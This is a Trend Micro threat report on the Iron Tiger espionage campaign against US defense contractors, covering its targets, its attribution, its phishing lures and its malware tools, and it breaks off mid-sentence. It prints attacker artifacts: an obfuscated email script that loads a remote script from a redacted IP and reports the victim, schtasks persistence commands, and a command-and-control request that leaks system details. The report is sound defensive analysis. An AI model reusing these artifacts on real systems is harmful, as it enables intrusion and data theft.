{
    "id": "c6803c06-a34f-4ce2-b209-fb33aed2dbfb",
    "created_at": "2022-10-25T16:48:24.389549Z",
    "updated_at": "2025-03-27T02:17:11.449491Z",
    "deleted_at": null,
    "sha1_hash": "5ee4cfb8802fd6a2dc6d936357a6ce16878778cf",
    "title": "Operation Iron Tiger: Exploring Chinese Cyber-Espionage Attacks on United States Defense Contractors",
    "authors": "",
    "file_creation_date": "2015-09-16T11:42:45Z",
    "file_modification_date": "2015-09-16T11:43:43Z",
    "file_size": 5662206,
    "plain_text": "# Operation Iron Tiger:\n#### Exploring Chinese Cyber-Espionage Attacks on United States Defense Contractors\n\n### Ziv Chang, Kenney Lu,  Aaron Luo, Cedric Pernet,  Jay Yaneza\n###### (Trend Micro Cybersafety Solutions Team)\n\n\n-----\n\nTREND MICRO LEGAL DISCLAIMER\n\nThe information provided herein is for general information\n\nand educational purposes only. It is not intended and\n\nshould not be construed to constitute legal advice. The\n\ninformation contained herein may not be applicable to all\n\nsituations and may not reflect the most current situation.\n\nNothing contained herein should be relied on or acted upon\n\nwithout the benefit of legal advice based on the particular\n\nfacts and circumstances presented and nothing herein\n\nshould be construed otherwise. Trend Micro reserves the\n\nright to modify the contents of this document at any time\n\nwithout prior notice.\n\nTranslations of any material into other languages are\n\nintended solely as a convenience. Translation accuracy is\n\nnot guaranteed nor implied. If any questions arise related\n\nto the accuracy of a translation, please refer to the\n\noriginal language official version of the document. Any\n\ndiscrepancies or differences created in the translation are\n\nnot binding and have no legal effect for compliance or\n\nenforcement purposes.\n\nAlthough Trend Micro uses reasonable efforts to include\n\naccurate and up-to-date information herein, Trend Micro\n\nmakes no warranties or representations of any kind as\n\nto its accuracy, currency, or completeness. You agree\n\nthat access to and use of and reliance on this document\n\nand the content thereof is at your own risk. Trend Micro\n\ndisclaims all warranties of any kind, express or implied.\n\nNeither Trend Micro nor any party involved in creating,\n\nproducing, or delivering this document shall be liable\n\nfor any consequence, loss, or damage, including direct,\n\nindirect, special, consequential, loss of business profits,\n\nor special damages, whatsoever arising out of access to,\n\nuse of, or inability to use, or in connection with the use of\n\nthis document, or any errors or omissions in the content\n\nthereof. Use of this information constitutes acceptance for\n\nuse in an “as is” condition.\n\n\n## Contents\n\n### 4\n\n#### Targets: From Asia-Pacific to the US\n\n### 8\n\n#### Actors: Tracing the operation’s Chinese roots\n\n### 11\n\n#### Operation: Iron Tiger hacks targets’ defenses\n\n### 51\n\n#### Mitigation: Combating cyber espionage and targeted attacks\n\n\n-----\n\nIf a single piece of valuable information can put a nation at a disadvantage, what could much more\n\nstolen data do? A group of China-based threat actors known as “Emissary Panda[1]” or “Threat\n\nGroup-3390 (TG-3390)[2]” may know the answer, as they have been seen stealing terabytes of\n\nconfidential data from employees of high-technology companies in the United States (US) since\n\n2013.\n\nTheir target? Government defense contractors and related companies. They specifically\n\ntargeted the directors and managers of US companies in the electric, aerospace, intelligence,\n\ntelecommunications, energy, and nuclear engineering industries, among others. Looking at the\n\ntargets, we believe the attackers constantly monitored technology-inclined US government\n\ncontractors.\n\nIn a cyber-espionage operation we dubbed “Iron Tiger,” the actors first spent years spying on\n\npolitical targets and government agencies in China, Hong Kong, and the Philippines back in 2010\n\nbefore eyeing technology-related organizations in the US. Given the huge geographical shift in\n\ntarget, it is very likely that Iron Tiger is only part of a bigger campaign where specific targets are\n\nassigned to various teams.\n\nThe actors have stolen emails, full Active Directory® dumps, intellectual property, strategic\n\nplanning documents, and budget- or finance-related content—all of which can be used to sabotage\n\ntarget governments’ or private organizations’ plans. We’ve even seen them nab up to 58GB\n\nworth of data from a single target. They could have even stolen terabytes of data in total.\n\nWe found convincing evidence pointing to China as the threat actors’ primary location. These\n\nindicators include the use of virtual private network (VPN) servers that only accepted China-\n\nbased registrants, Chinese file names and passwords, and China-registered domains. Specifically\n\nfollowing two virtual aliases, “phpxss” and “ershao,” we were able to attribute operational\n\nactivities to a key personality physically located in China.\n\nNote that the actors are skilled in launching digital attacks. They not only followed new malware-\n\ncreation tool releases but also used customized tools like dnstunserver and abused legitimate\n\nservices like Blogspot™ and the Google Cloud Platform™. Using legitimate services allowed\n\nthem to evade monitoring and efficiently change command-and-control (C&C) servers in case\n\nof discovery.\n\nWhile their techniques may be quite advanced, they adapt to their target networks’ security\n\nlevels and sparingly used sophisticated methods. Like any organized and motivated team, they\n\nexerted minimal effort to achieve maximum results.\n\n\n-----\n\n## Targets: From Asia-Pacific to the US\n\nQuality trumps quantity as far as Iron Tiger goes. It targets fewer individuals and organizations compared\n\nwith other campaigns like Russia-based cyber-espionage operation, Pawn Storm[3]. Yet like Pawn Storm,\n\nIron Tiger also spies on organizations where they are based.\n\nChina — 2010\nEducation\n\nHong Kong — 2010\nOthers (political organizations)\n\nPhilippines — 2010\nGovernment\n\nTibet — 2010\nOthers (political organizations)\n\nUnited States — 2013\nTechnology\n\nUnited States — 2013\nTelecommunications\n\nUnited States — 2013\nEnergy\n\nUnited States — 2013\nManufacturing\n\nGlobal distribution of Iron Tiger’s targets\n\nThe actors first monitored targets in the education industry in China, political dissidents in Hong Kong,\n\ngovernment agencies in the Philippines, and political targets in Tibet as far back as 2010. We believe\n\nindividual targets from each country were picked to gather inside information on political events that\n\nprevailed at the time.\n\nThe actors use spear-phishing email subjects that would be interesting to their chosen targets. They used\n\n“Han Zheng stays at Regent Pan—Housing protest held in advance” as lure to entice curious political targets\n\nto join a protest against then-mayor of Shanghai[4]. Other subjects exposed the attackers’ aim to target very\n\nimportant persons (VIPs), engineers, and/or public relations (PR) or communication officers.\n\n\n-----\n\nSample spear-phishing email sent to targets (subject in English, “Han Zheng stays at Regent Pan—\n\nHousing protest held in advance”)\n\nIn 2013, Iron Tiger’s targets changed. After achieving cyberspying feats, the attackers set out to catch\n\nbigger fish—individuals in defense- and technology-related fields like aerospace, energy, intelligence,\n\nnuclear engineering, and telecommunications. Looking at the targets, we believe the attackers constantly\n\nmonitored high-technology contractors of the US government.\n\n###### Up to terabytes of stolen data\n\nThe actors are believed to have stolen up to terabytes of data, given the sheer amount of information\n\nthey gathered from each target. They were able to extract as much as 58GB worth of data from a single\n\norganization. This was even more than the 40GB worth of data leaked after the Sony Pictures hack[5].\n\n\n-----\n\nTypes of data stolen by the Iron Tiger actors\n\nA compromised Microsoft® Exchange™ server\n\nshowed that Iron Tiger uses various exfiltration\n\nroutines. They install two different backdoors—\n\nBKDR_PLUGX.XXT and Dllshellexc2010 (which\n\nspecifically affects Microsoft Exchange). They\n\nrename files prior to extraction using extensions\n\nlike .CSS to bypass security protections put in\n\nplace for archived files (.ZIP, .7z, .RAR, etc.).\n\nActual content found inside a 58GB archive\n\nstolen from a single target organization\n\nContent of a .7z file named “txt.css” generated\n\nby the attackers on a compromised network\n\n\n-----\n\nThe actors also use Robocopy, an application that lets users remotely copy files to local hard drives in order\n\nto extract them from a server. Finally, they export mailboxes to a .PST file using the “Export-Mailbox”\n\nPowerShell command. Data meant to be stolen is always stored as encrypted .7z files in the Microsoft\n\nOutlook® Web App (OWA) folder.\n\n\n#### With all of the files in their hands, the actors may know everything about the network and its users, making lateral movement possible. The possibilities are endless. At this point, they obtain the highest privilege levels on the compromised network.\n\n\n-----\n\n## Actors: Tracing the operation’s Chinese roots\n\nThe following pieces of evidence revealed that the Iron Tiger actors can be Chinese-speaking individuals\n\nproficient in computer security and launching digital attacks:\n\n- The VPN servers were mostly located in China like those provided by BAIGE VPN.\n\n- The file names and passwords used were Chinese.\n\n- Some text resources and language IDs used in malware binaries were set to simplified Chinese.\n\n- HUC Packet Transmit Tool (HTran) is frequently used by Chinese threat actors.\n\n- Whois data revealed that related domains like shangxian.info were registered with physical addresses\n\nin China.\n\n- The other related resources (QQ, Lofter, 163.com) are popularly used in China.\n\n##### Is “Fei” behind Iron Tiger?\n\nFollowing virtual aliases related to Iron Tiger allowed us to attribute operational activities to a key\n\npersonality—Guo Fei—who resides in Shanghai, China.\n\n###### Phpxss and exenull\n\nThe systematic use of these two nicknames, their use of the same password to encrypt files, and the way they\n\naccessed C&C servers made us believe that only a few key individuals rather than a huge group of people\n\nwere behind the campaign. Phpxss was probably a reference to cross-site scripting (XSS) vulnerabilities\n\nbased on PHP. This choice of nickname made us believe that the actor had ties to traditional cybercrime.\n\nPhpxss had ties to xssok.blogspot.com and phpxss.lofter.com—C&C servers for three Trojans (dnstunnel,\n\nNBDDOS, and PlugX) related to Iron Tiger. The malicious tool, dnstunclient, accesses xssok.blogspot.com\n\nto know what the controlling IP address is. A Gh0st variant, meanwhile, accesses phpxss.lofter.com, which\n\nleads to a C&C server.\n\nPhpxss also serves as username for several email addresses from different free email providers and the\n\nBAIGE-VPN-provided service. One of the subdomains under shangxian.info that points to a C&C server\n\nhas also been registered with the name, “php xss,” and the email address, [REDACTED]s @ gmail . com.\n\n\n-----\n\n```\nRegistrant Email: [REDACTED]s @ gmail . com\nRegistrant Name: php xss\nRegistrant Organization:\nRegistrant Street: shanghairoad\nRegistrant City: shanghai\nRegistrant State/Province: sldkkk\nRegistrant Postal Code: 200000\nRegistrant Country: CN\nRegistrant Phone: +86.[REDACTED]53232\n\n```\n\nWhois information tied to shangxian.info and registered by php xss\n\nWe also found a blog comment with the name, “phpxss,” which led to an email address; a QQ number\n\n(693149); and the name, “Guo Fei.” Additional research on the QQ number led us to a person named\n\n“郭飞,” which translates to “Guo Fei.” The name, “exenull,” meanwhile, was used by the same person to\n\nregister on target sites or forums.\n\nComment by phpxss linked to a Gmail account\n\nand QQ number owned by Guo Fei\n\nPhpxss’s geographical information\n\n\n-----\n\nQQ Insight Labs overview of the QQ number, “693149”\n\nMore information on the QQ number, “693149”\n\nErshao and myershao\n\nErshao and myershao were other nicknames tied to the name, “Guo Fei.” These were found in leaked\n\nunderground forum databases and had ties to the same QQ number that phpxss used. A related email\n\naddress found in underground forums, _[REDACTED]o @ live . cn,_ was also used to register the domain,\n\n_mai1.info, which had ties to Iron Tiger._\n\n\n-----\n\n## Operation: Iron Tiger hacks targets’ defenses\n\nThe Iron Tiger actors can be skilled computer security experts but sparingly used advanced techniques,\n\ngiven their weakly protected target networks. They do not follow a specific schedule when it came to\n\nlaunching attacks. Instead, they prioritize attacks based on a list of chosen targets. We have, for instance,\n\nseen them dump the contents of a company’s Active Directory database nine months prior to actual data\n\nexfiltration.\n\n\nIIS exploit binaries (CVE-2008-1436)\n\n\nQuarksPwDump\n\n\nGTalkTrojan\n\n\ns.exe\n\n\nHTTPBrowser\n\n\nDllshellexc2010\n\n\nNBDDOS\n\n\nPlugX\n\n\nDnstunclient\n\n\nRing RAT\n\n\nGoogle Cloud Platform Trojan\n\n\nPlugX\n\n|Col1|2010 2011 2012 2013 2014 2015|\n|---|---|\n\n\n2016\n\nMalware and tools that Iron Tiger used sorted by compilation date\n\nInvestigations revealed several Iron Tiger-specific routines. The actors are fond of using customized hacking\n\ntools like dnstunserver and known targeted attack malware, PlugX and Gh0st variants, to remotely access\n\ntarget networks.\n\nThe attackers abuse free Web services to accomplish their goals. They set up C&C servers in the free blogging\n\nplatform, Blogspot; connected a Gh0st variant to the Chinese blogging platform, Lofter; and created email\n\n\n-----\n\naccounts in Gmail™ and Microsoft Outlook. They also maintain a clean and controlled command center,\n\ngoing as far as patching one of the C&C servers they compromised and running the WebShellKill backdoor\n\nfinder on it to keep cybercriminals or script kiddies away.\n\nWhen laterally moving inside networks, they use a stolen code-signing certificate from Korea-based security\n\ncompany, SoftCamp Co., Ltd., to evade security solutions. To get deeper into networks, they intercept\n\nMicrosoft Exchange™ credentials using Robocopy and the “Export-Mailbox” PowerShell command—both\n\nunique means. They also use a Trojan that was specifically designed to only work on the Google Cloud\n\nPlatform.\n\n##### Spear phishing\n\nThe Iron Tiger actors likely gather solid information about organizations they want to infiltrate before\n\nzeroing in on specific figure heads. Quick Web searches on how specific organizations formulate email\n\naddresses can give them clues on target individuals’ specific addresses. Using these addresses, the attackers\n\nhave been sending spear-phishing emails to compromise computers in target networks as early as April\n\n2010.\n\nThe target individuals have varying professional classes, ranging from company executives and government\n\nofficials to engineers and PR officers. Some of their addresses can be easily found on the Internet. Others\n\nare not publicly available, which shows that the attackers have a certain level of maturity in reconnaissance\n\nor data gathering.\n\nThe actors use two addresses to send spear-phishing emails. One of these has been in use since 2010. This\n\nis surprising, given that threat actors typically drop email addresses after a short period of time in order to\n\nevade detection. This can be a reflection of their confidence that their spear-phishing campaigns will stay\n\nundetected regardless.\n\nThe “From” field in messages sent via both addresses is usually modified to reflect the spear-phishing\n\nscheme used for a given target. The attackers often use names that pique the targets’ interests (affiliated\n\nwith news agencies like the British Broadcasting Corporation [BBC] or the Agence France-Presse [AFP]).\n\nSubjects ranging from the generic to the more professional or personal are also used. Samples include\n\n“Shanghai mayor Han Zheng visits Taipei to promote World Expo,” “Han Zheng stays at Regent Pan—\n\nHousing protest held in advance,” and “Sino-US cooperation on maritime security seminar neighborhoods.”\n\n\n-----\n\n|Date|Industry (based on recipient)|Subject|Translation|\n|---|---|---|---|\n|25 November 2009|Others|How about your parents?|Not applicable|\n|3 April 2010|Communications and media|Smurfs, Bollywood give Shanghai Expo star power|Not applicable|\n|3 April 2010|Others (political organizations)|Hong Kong lawmakers give lukewarm response to Shanghai Expo trip|Not applicable|\n|6 April 2010|Others (political organizations)|上海市長韓正訪問台北 推廣世博|Shanghai mayor Han Zheng visits Taipei to promote World Expo|\n|6 April 2010|Others (political organizations)|韓正下榻晶華 綠營提前 住房抗議|Han Zheng stays at Regent Pan—Housing protest held in advance|\n|7 April 2010|Education|关于中美海上安全合作 讲座求教|Sino-US cooperation on maritime security seminar neighborhoods|\n|7 April 2010|Education|征询|Consultation|\n|10 April 2010|Others (political organizations)|Tashi Delek after long time! (Note that “Tashi Delek” is a Tibetan form of greeting that is usually translated to “Blessings and good luck.”)|Not applicable|\n|16 April 2010|Government|2010年度部级法学研究 课题申报公告|Research ministerial declaration of the “2010 Law Bulletin”|\n|9 July 2010|Government|Forging a US-Brazil strategic partnership|Not applicable|\n|9 July 2010|Government|Brazil’s new security strategy and defense doctrine|Not applicable|\n|10 July 2010|Others (political organizations)|FW: Tuesday’s meeting at 10 is cancelled|Not applicable|\n|10 July 2010|Others (political organizations)|FW: Can we meet to discuss your coming trip?|Not applicable|\n|10 July 2010|Others (political organizations)|RE: Staff meeting is Wednesday at 14:00|Not applicable|\n|10 July 2010|Others (political organizations)|The minutes from last week’s board meeting|Not applicable|\n\n\n-----\n\n|Date|Industry (based on recipient)|Subject|Translation|\n|---|---|---|---|\n|14 July 2010|Education|Homeland Security and Defense|Not applicable|\n|3 August 2010|Government|您好，我是刚毕业的， 投简历一份，希望有幸 成为贵公司一员|Hello, I just graduated, attached is my resume, hoping to get the opportunity to be part of your company|\n|5 August 2010|Others (political organizations)|Will you come?|Not applicable|\n|5 August 2010|Manufacturing|Summit on nuclear safety issues discussed|Not applicable|\n|17 August 2010|Others (political organizations)|How about recent days?|Not applicable|\n|6 September 2010|Manufacturing, technology, others (nonprofit organizations)|2010 Sandia nuclear weapons research topic|Not applicable|\n|10 September 2010|Others (political organizations)|警告钓鱼岛挑衅者，希 望不要把中国的愤怒点 燃|Warning Diaoyu provocateurs, hoping not to ignite China’s ire|\n|25 January 2011|Others|Backup (Note that this was sent by “Admin.”)|Not applicable|\n|23 April 2013|Government|The new foreign policy frontier|Not applicable|\n|23 April 2013|Government|Economic development and reconstruction|Not applicable|\n|23 April 2013|Government|Taiwan’s response to an evolving security environment|Not applicable|\n|23 April 2013|Government|Taiwan|Not applicable|\n|25 April 2013|Government|Taiwan’s response to an security|Not applicable|\n|9 May 2014|Government|The future of the US Army Officer Corps|Not applicable|\n|9 May 2014|Government|Illicit international activities|Not applicable|\n|5 September 2014|Telecommunications, technology|#COMPANYNAME# jobs! Help me! Help me!|Not applicable|\n|12 October 2014|Telecommunications|佘氏论坛改版需求|Forum needs revision|\n\n\nMore spear-phishing email subjects used in Iron Tiger\n\n\n-----\n\nThe spear-phishing emails had limited content, usually only one or two lines of text. They came with archive\n\nfile attachments (usually .RAR files) that contained malicious .EXE files.\n\nSample Iron Tiger spear-phishing email\n\nThe email above had a hidden image, which was actually a “Web bug” that allowed attackers to get more\n\ninformation from target systems like IP addresses, browser versions, and others. Some emails had slightly\n\nobfuscated code. When deobfuscated, the code tries to run a remote script. We were, unfortunately, unable\n\nto retrieve the said js.php script.\n\nEmail source code that shows the HTML content, including the Web bug\n\n\n-----\n\n```\n<div id=”code” title=”emailkey=’##REDACTED##’;window.onerror=function(){return\ntrue;};if(window.ufoufoufo!=1){framedir=’http://’;framedir=framedir+’##REDAC\nTED-IPADDRESS##:2687/h/’;yyuser=’##REDACTED E-MAIL ADDRESS##’;_x_=document.\ncreateElement(‘SCRIPT’);_x_.src=framedir+’/js.php?key=’+emailkey+’&msg=’+esca\npe(‘-’+yyuser+’^-!!-’+document.location);document.insertBefore(_x_,document.\ngetElementsByTagName(‘*’)[0]);ufoufoufo=1;}”></div><style>\np,font,table{\ntop:rgb(‘88’,80,’180);\ntop:rgb(‘) !important\nheight:expression( (window.r==123)?x=8:(eval(code.title)==20088) || (r=123)   \n)  }’,80,’180);\n}\n</style>\n<p>-</p><font>-</font>\n\n```\n\nSlightly obfuscated code in an Iron Tiger email\n\n```\nhttp://##REDACTED IP ADDRESS:2687/h/js.php?key=##REDACTED##&msg=-##REDACTED\nE-MAIL ADDRESS##^-!!-document.location\n\n```\n\nDecoded version of the slightly obfuscated code\n\n###### Arsenal\n\nWhile the malware and tools that the actors used were publicly available, some were not at the time this\n\npaper was written.\n\nDnstunclient\n\nDnstunclient was named after strings found inside its binary (SHA-1: afce5e56fc9bd1774d0cbbab1df205d0152fc632,\n\ndetected by Trend Micro as HKTL_DNSTunnel). This has an interesting way of communicating with the\n\nattackers and finding C&C servers. It fetches the home page of a blog, xssok.blogspot.com, with information\n\non how to reach a C&C server. Contacting the blog was registered as a scheduled task on a compromised\n\nsystem, which runs every Sunday at 8:00 A.M. (matching the infected system’s time zone) and fetches the\n\nBlogspot page.\n\n\n-----\n\nHome page of xssok.blogspot.com\n\n```\nC:\\Windows\\System32\\cmd.exe /C schtasks /create /tn “Microsoft Windows” /tr\n[FILE NAME] /sc weekly /d SUN /st 08:00:00 /ru System”\n\n```\n\nCode that set when compromised systems should access the blog\n\n```\nFormat:  “$$$$$$$$$$[Day OF Week]#####[DNS or IP]$$$$$$$$$$”\nExample: “$$$$$$$$$$SUN#####10.10.10.10$$$$$$$$$$”\n\n```\n\nFormat used to provide dnstunclient with a C&C server’s IP address\n\nOn Windows Vista or newer systems, the scheduled task is registered as shown below.\n\n```\nC:\\Windows\\System32\\cmd.exe /C schtasks /create /tn “\\Microsoft\\Windows\\PLA\\\nSystem\\Microsoft Windows” /tr [FILE NAME] /sc weekly /d SUN /st 08:00:00 /ru\nSystem”\n\n```\n\nScheduled task code on Windows Vista or newer systems\n\nRunning the scheduled task decodes the information provided by the blog so the system can access the\n\nactual C&C server. A reverse command shell then runs using the Domain Name System (DNS) protocol\n\nwith CNAME and A queries on User Datagram Protocol (UDP) port 53.\n\n\n-----\n\nDNS protocol used as communication channel by a malware variant\n\nThe said malware is Base64 encrypted and so can easily be decrypted. Further analysis of the binary\n\nrevealed that it was a command-line tool that was modified to work on its own. Its original version can be\n\nused with arguments like:\n\n_•_ _dnstunclient -ip <server ip address>_\n\n_•_ _dnstunclient -d or -domain <domain>_\n\nThe modified version, meanwhile, forced the use of xssok.blogspot.com.\n\n```\nv5 = (int *)argv;\n *argv = aAaa;\n argv[1] = aIp_0; //Set argument 1 to –ip\n v6 = (const char *)sub_402A40(); //get C2 server ip from blog\n argv[2] = v6; //Set argument 2 to C2 server ip\n\n```\n\nModified tool code that forces the use of xssok.blogspot.com instead of arguments\n\nReverse engineering allowed us to see the tool’s original output. The original dnstunclient is a console\n\nprogram that can be used for temporary lateral movement but it has been modified to act as a Trojan. The\n\nmodified tool adds extra functions to replace or add parameters while the original always read parameters\n\nfrom the console input. As such, the modified tool grabs parameters from a remote Web page.\n\n\n-----\n\nSample output of the original dnstunclient tool\n\nThe “wzrapbia” string the modified tool creates is automatically generated but can’t be used as an indicator\n\nof compromise (IoC).\n\nOver the past year, Iron Tiger increasingly used similar channels to communicate—an obvious attempt at\n\nstaying undetected. Log file reviewers will probably classify Blogspot-related requests as legitimate but\n\ndnstunclient still only accesses xssok.blogspot.com once a week as a precautionary measure.\n\nWe monitored xssok.blogspot.com for C&C changes for several months but saw very few modifications.\n\nThe blog, for instance, moved twice to an internal IP address _(192.168.[REDACTED])_ before switching\n\nagain to a compromised server owned by an Asian academic institution.\n\nDnstunserver\n\nDnstunserver is not available anywhere online, even on underground forums. It was most likely developed\n\nor bought for Iron Tiger’s exclusive use.\n\nThe binary (SHA-1: _eeec12cb0dcc7c77a4ecee9facd2ccc1f3e2d93c,_ detected by Trend Micro as HKTL_\n\nDNSTunnel) was compiled just this February. It is dnstunclient’s server part. When launched, it opens a\n\nfake DNS service on UDP port 53 and waits for connections from victims. When a connection is established,\n\ndnstunserver provides a remote shell that allows the attackers to execute commands on infected computers.\n\nDnstunserver’s server part has interesting debug information like the following paths with Chinese words\n\nformed using the Guojia Biaozhun (GB2312) character set, the “national standard” (Note that “桌面”\n\ntranslates to “desktop.”):\n\n_•_ _C:\\Documents and Settings\\Administrator\\桌面\\dns control\\t-DNSTunnel\\DnsTunServer\\dns.cpp_\n\n_•_ _C:\\Documents_ _and_ _Settings\\Administrator\\桌面\\dns_ _control\\t-DNSTunnel\\DnsTunServer\\_\n\n_DnsTunServer.cpp_\n\n_•_ _C:\\Documents_ _and_ _Settings\\Administrator\\桌面\\dns_ _control\\t-DNSTunnel\\DnsTunServer\\_\n\n_memory.cpp_\n\n\n-----\n\n_•_ _C:\\Documents and Settings\\Administrator\\桌面\\dns control\\t-DNSTunnel\\DnsTunServer\\socket._\n\n_cpp_\n\nExchange backdoor + WebShell = Dllshellexc2010\n\nIron Tiger uses a backdoor called “Dllshellexc2010” by its author on a Microsoft Exchange server that\n\nbelongs to a target. Dllshellexc2010 is a tool customized for the attackers’ exclusive use. It is a .NET module\n\n(SHA-1: 08afa64b23288c0414b379cb4e67c1a8dabea033), a very small dynamic link library (DLL) (less\n\nthan 8kB in size) that can be installed on Microsoft Exchange or Internet Information Services (IIS) servers\n\nfor the purpose of stealing users’ authentication credentials while logging in. It provides a WebShell to the\n\nmachine, in addition to credential-stealing capabilities.\n\n```\nc:\\Users\\ljw\\Documents\\prj\\dllshell\\Dllshell\\Dllshellexc2010\\obj\\Release\\\nMicrosoft.Exchange.Clients.Auth.pdb\n\n```\n\nDebug string found in Dllshellexc2010’s binary\n\nWebShell that Dllshellexc2010 provides\n\nThe WebShell does not require any physical ASP.NET file to be present in the IIS directory. It runs every time\n\nan HTTP request to any path ending with “x.aspx” is sent. It creates a temporary file called “8xla90ssz7693.\n\n_tmp” with a tiny WebShell in the %TEMP% folder, which is later executed._\n\nDllshellexc2010’s source code shows that it extracts a parameter called “chopper” when executed, just like\n\nthe infamous WebShell, 中國菜刀 or China Chopper[6]. We believe this DLL was created by someone very\n\nfamiliar with China Chopper. We decided to test it in a controlled China Chopper environment and found\n\n\n-----\n\nthat it worked perfectly. Dllshellexc2010 also intercepts Microsoft Exchange credentials every time a request\n\npath that contains “/auth.owa,” a default log-in path for OWA, is used. Note the use of Chinese in the log\n\nfile generated. Intercepted credentials are written to a hard-coded file called “%TEMP%\\~4DAF8B\\~P486.\n\n_jpg” on the infected system’s disk. It uses the .JPG extension even though it is actually a text file._\n\nWebShell that Dllshellexc2010 provides inside the China Chopper graphical user interface (GUI)\n\nCode used to log usernames and passwords\n\nStolen credentials are written to %TEMP%\\~4DAF8B\\~P486.jpg\n\n\n-----\n\nSample result of Dllshellexc2010’s credential-stealing capability\n\nAttacker’s browsing history and related tools\n\nWe were able to examine the browsing history of a C&C server that the actors compromised and saw how\n\nthey quietly accessed parts of their arsenal (malware and tools) that was hosted elsewhere online. They\n\nstored a lot of their usual tools on a mac.pm server, which was hosted in the US and whose name servers\n\nare known for having ties to malware-related activities.\n\nURL SHA-1 Description\n\n/file/dump.7z Unknown Was not retrieved but is likely a\nGSecDump tool\n\n/file/7z.exe Legitimate file Legitimate .7z compressor\n\n/tool/dnser.exe eeec12cb0dcc7c77a4ecee9facd2ccc1f3e2d93c or Dnstunserver file\nHKTL_DNSTunnel\n\n/tool/wce.exe Legitimate file Legitimate Windows Credential\nEditor file\n\n/tool/ghost.rar ec0c179903e413490cec41c522ba612737d38c4a Contains Gh0st server Ring.exe\nvariant\n\nFiles downloaded by the attackers onto mac.pm\n\nThe attackers download a mixture of legitimate and malicious tools, including a famous Windows Credential\n\nEditor password dumper, GSecDump, and a .7z compressor.\n\nDnstunserver is also stored on mac.pm, together with a .RAR file that can contain Ring.exe, a Gh0st remote\n\naccess tool (RAT) variant.\n\nThe actors also download files that belong to a private South Korean company (whose name we do not wish\n\nto disclose) from a compromised domain.\n\nURL SHA-1 Description\n\n/webnote/upload/ 1f8dec3ea9b25de862a11b4d807f0d8de00c7972 PlugX Server 3.0: EFH3.exe,\ntest/3f.7z FastDos.exe, FastGui.exe,\nFastProxy.exe\n\n/webnote/upload/ ac6ee2d9cadf5415ad85f7cb756d6c46022a5ecf Cracked version of Internet\nint.rar Download Manager\n\nFiles downloaded from a compromised private South Korean company’s site\n\n|URL|SHA-1|Description|\n|---|---|---|\n|/file/dump.7z|Unknown|Was not retrieved but is likely a GSecDump tool|\n|/file/7z.exe|Legitimate file|Legitimate .7z compressor|\n|/tool/dnser.exe|eeec12cb0dcc7c77a4ecee9facd2ccc1f3e2d93c or HKTL_DNSTunnel|Dnstunserver file|\n|/tool/wce.exe|Legitimate file|Legitimate Windows Credential Editor file|\n|/tool/ghost.rar|ec0c179903e413490cec41c522ba612737d38c4a|Contains Gh0st server Ring.exe variant|\n\n|URL|SHA-1|Description|\n|---|---|---|\n|/webnote/upload/ test/3f.7z|1f8dec3ea9b25de862a11b4d807f0d8de00c7972|PlugX Server 3.0: EFH3.exe, FastDos.exe, FastGui.exe, FastProxy.exe|\n|/webnote/upload/ int.rar|ac6ee2d9cadf5415ad85f7cb756d6c46022a5ecf|Cracked version of Internet Download Manager|\n\n\n-----\n\nThe files in the table on the previous page have since been removed. One of the target organizations must\n\nhave cleaned its Web server.\n\n_3f.7z, a file downloaded from a compromised server, was encrypted with an unknown password. We were_\n\nunable to decrypt it but were able to list its contents. The same files related to the PlugX or KorPlug RAT\n\nwere found on the C&C server. These were likely the contents of 3f.7z.\n\nWebShellKill\n\nThe Iron Tiger actors downloaded a Chinese tool called “WebShellKill,” which is publicly available. They\n\nuse an old version (V1.4.1) of the tool even if V1.7.2 was already available at the time this paper was written.\n\nWebShellKill features as advertised by its author\n\nIt may be puzzling to find WebShellKill on attackers’ servers because it is used to find backdoors in code\n\n(PHP, ASP, VBS, etc.). But since attackers generally plant backdoors anywhere, why would they want to\n\nremove them?\n\nWe quite easily found the answer when we saw the actors compromise a server and immediately launch the\n\ntool. The server they chose had several backdoors, which they got rid of via WebShellKill. They probably\n\nwanted to make sure the compromised server was clean and could not be easily accessed by script kiddies\n\nor even cyberdefenders.\n\n\n-----\n\n#### The Iron Tiger actors seem to really care about not being hacked. They went so far as patching a compromised C&C server by logging in as administrator and deploying security fixes.\n\n\nGoogle Cloud Platform Trojan\n\nThe Iron Tiger actors bought a Trojan that\n\nonly worked on the Google Cloud Platform. Its\n\nC&C server accesses an _appspot.com_ domain.\n\nWe found a version of the Trojan’s server-side\n\ncomponent that was coded in Python. Note that\n\nusing Python for coding Trojans is unusual. We\n\nalso found a file called “app.yaml,” which was the\n\nTrojan’s configuration file.\n\n\nClient or server options that the Google Cloud\n\nPlatform Trojan uses\n\n|URL|Function|Affected party|\n|---|---|---|\n|/user|Accesses servers when online|Victims|\n|/userlist|Dumps all available clients|Attackers|\n|/client|Checks server status (on standby or working)|Victims|\n|/server|Turns server on and/or off|Attackers|\n|/data|Starts subcommands (pr, fi, sh, dir, or uninstall)|Victims and attackers|\n|/pr|Lists or kills running processes|Victims and attackers|\n|/fi|Uploads or downloads files|Victims and attackers|\n|/sh|Executes commands|Victims and attackers|\n|/dir|Lists directory contents|Victims and attackers|\n\n\nGoogle Cloud Platform Trojan’s functions\n\nThe Trojan was installed on 13 machines that belong to a target company most likely for lateral movement.\n\nWe also found a variant of its client part that was compiled on 23 March 2015. The sample is named\n\n_“svchost.exe,” a supposed key Microsoft Windows component. When launched, the binary tries to establish_\n\npersistence by adding a “Run” registry key named “iisini” to execute the file.\n\n\n-----\n\nClient-side properties of the Google Cloud\n\nPlatform Trojan\n\n\nThe Trojan then accesses a C&C server by\n\nsending the HTTP GET request, hxxp://exenull1.\n\n_appspot.com/user?pid=XXXXX&data=XXXXX._\n\nIt probably tracks victims via unique transmit\n\nPIDs generated on infected computers.\n\nThe data parameter had a Base64-encoded\n\nstring that, when decoded, contains “IP\n\naddress!Username!Company.” The Trojan’s\n\nUser-Agent was “WinHTTP Example/1.0” and\n\nwas likely created for the actors’ exclusive use.\n\nMalware\n\nThe Iron Tiger actors use three different RATs\n\ncommonly associated with targeted attacks\n\noriginating from China.\n\n\nCode that creates a persistence registry key on infected systems\n\n_BKDR_PLUGX_\n\nPlugX[7], also known as “Sogu,” “Gulpix,” or “KorPlug,” has been used as a RAT in several targeted attack\n\ncampaigns. Its author[8] or a developer with access to its source code has been updating it on a regular basis.\n\n\n-----\n\nPlugX variants use the DLL side-loading method to infect target computers. DLL side-loading involves\n\nabusing a legitimate Windows executable file to load a malicious DLL (PlugX) instead of a legitimate\n\nlibrary. All this requires is naming the malicious binary the same as the DLL that attackers wish to execute.\n\nPlugX is then loaded instead of the legitimate library in a system 